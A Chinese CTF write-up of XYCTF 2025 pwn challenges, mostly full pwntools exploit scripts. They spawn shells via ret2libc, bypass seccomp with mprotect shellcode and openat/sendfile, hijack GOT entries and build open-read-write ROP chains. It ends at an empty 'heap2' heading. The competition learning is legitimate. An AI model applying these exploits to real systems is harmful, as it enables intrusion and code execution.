
最近时间真的不太够用，所以WP出来后第一时间赶紧复现。

这次比赛还是遇到很多不会的题，总结来说还是刷题刷少了，不是想不到，而是根本没遇到过；感觉在我知识范围内的还是都能做。

为什么说是部分复现呢？因为不想碰`mips pwn`和`protobuf`

> 每天早上起来对着空气挥一拳，只因为不想做xxx！

另外提一嘴，得益于这次比赛的前几道题都给的是dockerfile，现在我的docker已经使用的比较熟练了（

### Ret2libc's Revenge

显然存在栈溢出，但是由于这道题的读取字符方式不太常见，有控制读取字符的参数在栈上，因此溢出的时候要多调几遍

可以在elf中找到`mov rdi, rsi`，另外能找到控制`rsi`的gadgets，于是得以泄露libc

但是泄露的时候要注意，这道题开启了输出全缓冲，因此要多来几遍把缓冲区打满，才能输出泄露的地址。

> 本地缓冲区与远程长度好像不太一样，打远程的缓冲区长度还是得多试试

泄露libc之后，剩下就是比较常规的做法了

```python
from pwn import *  
from LibcSearcher import *  
context(arch='amd64', os='linux', log_level='debug')  
  
binary_path = './attachment'  
gdb_script = "b *0x401180\n"  
#gdb_script += "b *0x401261\n"  
#gdb_script += "b main\n"  
gdb_script += "c\n"  
domain = "47.94.217.82"  
port = 34918  
global io, gdb_io  
elf = ELF(binary_path)  
libc = ELF("./libc.so.6")  
  
  
def connect(isLocal, isGDB, isIO):  
    if not isLocal:  
        io = remote(domain, port)  
        return io  
    elif isGDB:  
        if isIO:  
            io = process(binary_path)  
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)  
            return io, gdb_io  
        else:  
            io = gdb.debug(binary_path, gdb_script)  
            return io  
    else:  
        io = process(binary_path)  
        return io  
  
def attack(io):  
    puts_plt = elf.plt['puts']  
    payload = cyclic(0x210) + p64(1)  
    io.send(payload)  
    io.send(b'\x01')  
    io.send(b'\x02')  
    io.send(b'\x03')  
    io.send(b'\x04')  
    io.send(b'\x1d')  
    io.send(b'\x02')  
    io.send(b'\x00\x00')  
    rbp = 0x400648 - 0x20  
    io.send(p64(rbp))  
    gadget1 = 0x4010ea #add rsi  
    gadget2 = 0x401180 #mov rdi, rsi  
    pop_rbp = 0x4011f8 #顺便清除rax  
    and_rsi = 0x4010e0  
    bss = 0x404500  
    main = elf.symbols['main']  
    set_rdi = p64(and_rsi) + p64(gadget1) + p64(gadget2)  
    payload = set_rdi  
    payload += p64(pop_rbp) + p64(bss) + p64(puts_plt)  
    payload += p64(main) * 0xd7  
    io.sendline(payload)  
    for i in range(0xd6):  
        io.send(b"\n")  
        log.info("第{0}次".format(i+1))  
    io.recvuntil(b"Ret2libc's Revenge\n")  
    addr = u64(io.recv(6).ljust(8, b'\x00'))  
    print(hex(addr))  
    libc_base = addr - libc.symbols['setvbuf']  
    payload = cyclic(0x210) + p64(1)  
    io.send(payload)  
    io.send(b'\x01')  
    io.send(b'\x02')  
    io.send(b'\x03')  
    io.send(b'\x04')  
    io.send(b'\x1d')  
    io.send(b'\x02')  
    io.send(b'\x00\x00')  
    io.send(p64(bss))  
  
    pop_rdi = libc_base + 0x2a3e5  
    ret = libc_base + 0x2db7d  
    bin_sh = libc_base + libc.search(b'/bin/sh\x00').__next__()  
    system = libc_base + libc.sym['system']  
    payload = p64(gadget2) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)  
    io.sendline(payload)  
    io.interactive()  
  
if __name__ == '__main__':  
    while True:  #因为打远程有概率一次打不通，所以写个循环多打几遍
        try:  
            io = connect(False, True, False)  
            attack(io)  
        except Exception as e:  
            continue
```

刷新缓冲区：fflush、打满缓冲区、重新调用setvbuf

除此之外有师傅发现了通过打fgetc和IO的方式刷新缓冲区，由于我对IO利用还不太熟练，于是插个眼，半个月后再回来看。

### girlfriend

有`fmt`，一次就能泄露libc、canary以及pie，剩下绕过沙盒理应很简单，但是我做题的时候根本没有Libc文件，找也找不到，于是作罢

中间很多次怀疑是不是根本用不到libc，而是用其他的方式打沙盒 甚至开始去找CVE，所以到最后这道送分题都没做出来

赛后从 heshi 师傅那里学到一招：使用`strings`查看elf文件编译环境，从编译环境推测libc版本。

```shell
~/p/X/girlfriend ❯❯❯ strings ./pwn | grep GCC
GCC: (Ubuntu 10.5.0-1ubuntu1~22.04) 10.5.0
```

从Ubuntu 22.04可以确定大致的libc版本，由于题是这段时间出的，所以直接找22.04最新的修订版libc就行

后面绕过seccomp就简单了，我习惯的是打mprotect + shellcode

```python
from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')

local = 1
binary_path = './pwn'
gdb_script = "\n"
gdb_script += "b *$rebase(0x1676)\n"
#gdb_script += "b *$rebase(0x1708)\n"
#gdb_script += "b *$rebase(0x15c9)\n"
gdb_script += "c\n"
domain = "gz.imxbt.cn"
port = 20110
global io, gdb_io
elf = ELF(binary_path)
libc = ELF('./libc.so.6')

def connect(isLocal, isGDB, isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)
            return io, gdb_io
        else:
            io = gdb.debug(binary_path, gdb_script)
            return io
    else:
        io = process(binary_path)
        return io

def attack(io):
    io.sendafter(b"Choice:", str(3))
    fmt = "%7$p%3$p%15$p"
    io.sendafter(b"You should tell her your name first\n", fmt)
    io.recvuntil(b"your name:\n")
    leak_pie_addr = eval(io.recv(14))
    leak_write_addr = eval(io.recv(14)) - 23
    canary = eval(io.recv(18))
    pie = leak_pie_addr - (0x5fab223318d9-0x5fab22330000)
    log.success(f"Pie: {hex(pie)}")
    log.success(f"write: {hex(leak_write_addr)}")
    log.success(f"canary: {hex(canary)}")
    
    libc_base = leak_write_addr - libc.sym['write']
    print(hex(libc_base))
    pop_rdi = libc_base + libc.search(asm('pop rdi ; ret')).__next__()
    log.success(f"pop_rdi: {hex(pop_rdi)}")
    pop_rsi = libc_base + libc.search(asm('pop rsi ; ret')).__next__()
    log.success(f"pop_rsi: {hex(pop_rsi)}")
    pop_rdx = libc_base + 0x904a9
    log.success(f"pop_rdx: {hex(pop_rdx)}")
    shellcode_start = pie + 0x4500
    mprotect = libc_base + libc.sym['mprotect']
    read = libc_base + libc.sym['read']
    pop_rbx = libc_base + 0x35dd1

    io.sendafter(b"Choice:", str(3))
    new_rbp = pie+0x4300
    payload = p64(new_rbp) 
    payload += p64(pop_rdi) + p64((shellcode_start>>12)<<12)
    payload += p64(pop_rsi) + p64(0x1000)
    payload += p64(pop_rbx) + p64(0)
    payload += p64(pop_rdx) + p64(7)
    payload += p64(0)
    payload += p64(mprotect)
    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi) + p64(shellcode_start)
    payload += p64(pop_rdx) + p64(0x1000)
    payload += p64(0)
    payload += p64(read)
    payload += p64(shellcode_start)
    io.sendafter(b"You should tell her your name first\n", payload)
    io.recvuntil(b"Good luck!\n")
    #prepare before stack leave_ret

    io.sendafter(b"Choice:", str(1))
    leave_ret = pie + 0x14f4
    payload = cyclic(0x38) + p64(canary) + p64(pie+0x4060) + p64(leave_ret)
    io.sendafter(b"what do you want to say to her?", payload)
    #leave_ret
    
    io.recvuntil(b"but she left.........\n")
    shellcode = """
        mov rbx,0x67616C662F;
        push rbx;
        mov rsi,rsp;
        push 0;
        pop rdi;
        push 0;
        pop rdx;
        push 257;
        pop rax;
        syscall;
        mov rdi,1;
        mov rsi,3;
        mov rdx,0;
        mov r10,0x100;
        mov rax,40;
        syscall;
    """
    io.sendline(asm(shellcode))
    io.interactive()
if __name__ == '__main__':
    io = connect(False, True, False)
    attack(io)

```

> [!note] 总结
> - 绕过open使用openat
> - 绕过read/write使用sendfile，注意sendfile的count参数使用寄存器r10


### 明日方舟寻访模拟器

随机数很吓人，但是文件里有system函数也有gadget和栈溢出，能够通过控制bss上的抽卡次数变量构造`sh`字符串，然后拿shell，所以其实与随机数无关

```python
from pwn import *  
from LibcSearcher import *  
context(arch='amd64', os='linux', log_level='debug')  
  
binary_path = './pwn'  
gdb_script = "b *0x401877\n"  
gdb_script += "b *0x4018e5\n"  
gdb_script += "set detach-on-fork off\n"  
gdb_script += "c\n"  
domain = "47.93.96.189"  
port = 32834  
global io, gdb_io  
elf = ELF(binary_path)  
  
  
  
def connect(isLocal, isGDB, isIO):  
    if not isLocal:  
        io = remote(domain, port)  
        return io  
    elif isGDB:  
        if isIO:  
            io = process(binary_path)  
            (pid, gdb_io) = gdb.attach(io, gdb_script, api=True)  
            return io, gdb_io  
        else:  
            io = gdb.debug(binary_path, gdb_script)  
            return io  
    else:  
        io = process(binary_path)  
  
        gdb.attach(io,gdb_script)  
        return io  
  
def employ(number):  
    io.recvuntil("请选择：")  
    io.sendline(str(3))  
    io.recvuntil("请输入寻访次数")  
    io.sendline(str(number))  
    io.sendline("")  
  
  
def attack(io):  
    io.recvuntil("欢迎使用明日方舟寻访模拟器！祝你好运~")  
    io.sendline("")  
    for i in range(6):  
        employ(0x1000)  
    employ(0x873)  
    io.sendline(str(4))  
    io.sendline(str(1))  
    pop_rdi = 0x4018e5  
    ret = 0x40101a  
    payload = cyclic(0x48) + p64(pop_rdi) + p64(0x405BCC) + p64(0x4018fc)  
    io.sendlineafter("名字", payload)  
    io.interactive()  
if __name__ == '__main__':  
    io = connect(False, False, False)  
    attack(io)
```

看别人的wp说是能打栈迁移？

### web苦手

一道`webpwn`，首先是要想办法绕过对注册密码和登陆密码的比对：

我的做法是基于对密钥的加密算法为`PBKDF2`，盐值、生成密钥长度已知且迭代次数只有一次，在网上能够找到通过两串长度不同的密钥碰撞成同一个密钥的绕过方法（以及绕过的原理就是由于HMAC在大于64bytes和小于64bytes时的处理方法不同，题目里也对64bytes做了明确的划分，因此让我坚定了这样做的决心）

看别人WP说是能够进行`\x00`截断，我确实也考虑过这个方向，但是了解到加密算法能够直接破解就没管了

后续就是由于文件名后缀的`.dat`无法绕过，卡了一会儿，但是试了`/../../../flag`莫名其妙就出了

后续知道，是因为`snprintf`函数限定了size，超过size的字符串会被截断，于是`.dat`后缀被截断掉了

### 奶龙回家

这道题那真是纯纯的复现

奶龙上楼的层数（即程序给我们的执行次数）存在整数溢出，输入-1即可无限次执行（因为这里有一次看起来“毫无意义”的赋值，但实际上是从`int`转成`unsigned int`）

也有wp里是先计算出rbp精确位置直接改局部变量的

##### 打法1 retsled

与nopsled类似，nopsled通过不断执行nop滑向目标shellcode，而retsled通过不断执行ret滑向目标ROP链

这种打法的好处就是不打随机数，但缺点是对栈有要求，如果ROP链太长可能会覆盖关键数据导致程序崩溃

```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

binary_path = './nailong'
gdb_script = ""
#gdb_script += "b *0x401A1E\n" #b switch
#gdb_script += "catch syscall execve\n"
gdb_script += "c\n"
domain = "gz.imxbt.cn"
port = 20633
global io,gdb_io
elf = ELF(binary_path)
libc = ELF("./libc")

def connect(isLocal,isGDB,isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid,gdb_io) = gdb.attach(io,gdb_script,api=True)
            return io,gdb_io
        else:
            io = gdb.debug(binary_path,gdb_script)
            return io
    else:
        io = process(binary_path)
        return io

def leak(addr):
    io.sendlineafter("chose", str(1))
    io.sendlineafter("what you want do?\n", str(addr))
    addr = u64(io.recv(6).ljust(8, b"\x00"))
    log.success(f"leak_setvbuf:{hex(addr)}")
    return addr

def edit(addr, data):
    io.sendlineafter("chose", str(2))
    io.sendlineafter("what you want do?\n", str(addr))
    io.sendafter("read you want", data)

def write_addr(target, addr):
    edit(target, p32(addr&0xFFFFFFFF))
    edit(target+4, p32(addr>>32))

def attack(io):
    io.recvuntil("rbp + offset:")
    addr = eval(io.recvline()[:-4])
    log.success(f"leak_addr:{hex(addr)}")
    io.sendline(str(-1)) #change to 0xffffffff

    setvbuf_addr = leak(elf.got['setvbuf']) #leak libc
    libc_base = setvbuf_addr - libc.symbols['setvbuf']

    #edit(elf.got['sleep'], p16(0x101a)) #修改sleep为ret使其通过seccomp
    write_addr(elf.got['sleep'], 0x40101a)

    ret = 0x40101a
    retsled_start = ((addr - 0x200) >> 4) << 4#由于泄露范围在0x50-0x200，直接选取-0x200最为稳妥
    target = retsled_start
    log.success(f"target:{hex(target)}")

    for i in range(0x50):
        write_addr(target, ret)
        target = target + 8

    pop_rdi = libc_base + 0x2a3e5
    pop_rsi = libc_base + 0x2be51
    pop_rdx_pop_rbx = libc_base + 0x904a9
    open = libc_base + libc.symbols['open']
    read = libc_base + libc.symbols['read']
    write = libc_base + libc.symbols['write']
    flag_addr = 0x404200
    buf_addr = (retsled_start>>12)<<12
    pathname = flag_addr #要对其进行引用
    flag = 0
    #构造ROP链
    #open():rdi='/flag'地址,rsi=0
    #read():rdi=3,rsi=addr,rdx=len
    #write():rdi=1,rsi=addr,rdx=len
    ROP = [
        pop_rdi,
        pathname, #pathname
        pop_rsi,
        flag, #flag
        open, #call open
        pop_rdi,
        3, #fd
        pop_rsi,
        buf_addr, #buf
        pop_rdx_pop_rbx,
        0x100,#len
        0,
        read,#call read
        pop_rdi,
        1,   
        pop_rsi,
        buf_addr,
        pop_rdx_pop_rbx,
        0x100,
        0,
        write,
    ]

    write_addr(flag_addr,int.from_bytes(b"/flag\x00", 'little')) #flag地址
    for i in ROP:
        write_addr(target, i)
        target = target + 8

    pause()

    edit(elf.got['nanosleep'], p16(0x101a))
    edit(elf.got['exit'], p16(0x1646))  #执行ROP链
    io.sendlineafter("chose", str(4))
    pause()
    io.interactive()

if __name__ == "__main__":
    io = connect(False,True,False)
    attack(io)

```

> 奶龙回家是滑回家的？

> [!note] 总结
> - 劫持got不一定要劫持为函数，也可以劫持为gadget
> - 将函数got劫持为`ret`，其效果等于直接执行下一条指令
> - `leave, ret`不一定用来栈迁移，也可以用来快速定位rbp

##### 打法2 随机数预测

[2025XYCTF|NPUSEC](https://www.npusec.org.cn/archives/2025xyctf#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6)

假设我们没有想到用整数溢出修改局部变量，那么就只能打这种办法：

```c
  v3 = time(0LL);
  srand(v3);
  LODWORD(v19) = rand() % 0x1B0 + 0x50;
```

由于此处的随机数是用time()作为种子生成的，所以在打远程时在本地运行同一个patch过的elf，它们生成的随机数大概率是相同的，以此泄露出真实rbp，直接修改局部变量

后续再利用无限次修改往栈上写ROP链，再修改局部变量，跳出循环，待程序自然返回即可

```python
from pwn import *
context(arch='amd64', os='linux',log_level='debug')

binary_path = './nailong'
gdb_script = ""
gdb_script += "b *0x401A1E\n" #b switch
#gdb_script += "catch syscall execve\n"
gdb_script += "c\n"
domain = "gz.imxbt.cn"
port = 20742
global io,gdb_io
elf = ELF(binary_path)
libc = ELF("./libc")

def connect(isLocal,isGDB,isIO):
    if not isLocal:
        io = remote(domain, port)
        return io
    elif isGDB:
        if isIO:
            io = process(binary_path)
            (pid,gdb_io) = gdb.attach(io,gdb_script,api=True)
            return io,gdb_io
        else:
            io = gdb.debug(binary_path,gdb_script)
            return io
    else:
        io = process(binary_path)
        return io

def leak(addr):
    io.sendlineafter("chose", str(1))
    io.sendlineafter("what you want do?\n", str(addr))
    addr = u64(io.recv(6).ljust(8, b"\x00"))
    log.success(f"leak_setvbuf:{hex(addr)}")
    return addr

def edit(addr, data):
    io.sendlineafter("chose", str(2))
    io.sendlineafter("what you want do?\n", str(addr))
    io.sendafter("read you want", data)

def write_addr(target, addr):
    edit(target, p32(addr&0xFFFFFFFF))
    edit(target+4, p32(addr>>32))

def attack(io,offset):
    io.recvuntil("rbp + offset:")
    addr = eval(io.recvline()[:-4])
    rbp = addr - offset
    log.success(f"leak_rbp:{hex(rbp)}")
    
    io.sendline(str(2))
    edit(rbp-(0x8040-4), p32(0xffffffff))
    setvbuf_addr = leak(elf.got['setvbuf']) #leak libc
    libc_base = setvbuf_addr - libc.symbols['setvbuf']

    #edit(elf.got['sleep'], p16(0x101a)) #修改sleep为ret使其通过seccomp
    write_addr(elf.got['sleep'], 0x40101a)
    #构造ROP链
    pop_rdi = libc_base + 0x2a3e5
    pop_rsi = libc_base + 0x2be51
    pop_rdx_pop_rbx = libc_base + 0x904a9
    open = libc_base + libc.symbols['open']
    read = libc_base + libc.symbols['read']
    write = libc_base + libc.symbols['write']
    flag_addr = 0x404200
    buf_addr = (rbp>>12)<<12
    pathname = flag_addr
    flag = 0
    target = rbp + 0x8
    ROP = [
        pop_rdi,
        pathname, #pathname
        pop_rsi,
        flag, #flag
        open, #call open
        pop_rdi,
        3, #fd
        pop_rsi,
        buf_addr, #buf
        pop_rdx_pop_rbx,
        0x100,#len
        0,
        read,#call read
        pop_rdi,
        1,   
        pop_rsi,
        buf_addr,
        pop_rdx_pop_rbx,
        0x100,
        0,
        write,
    ]
    write_addr(flag_addr,int.from_bytes(b"/flag\x00", 'little')) #flag地址
    for i in ROP:
        write_addr(target, i)
        target = target + 8
    edit(rbp-(0x8040-4), p32(0x000000000))
    pause()
    io.interactive()

if __name__ == "__main__":
    io = connect(False,True,False)
    p = process("./nailong_patched")
    p.recvuntil("rbp + offset:")
    offset = int(eval(p.recvline()[:-4])/2)
    log.success(f"offset:{hex(offset)}")
    p.close()
    attack(io,offset)

```

可以直接在IDA里对程序进行patch

### heap2

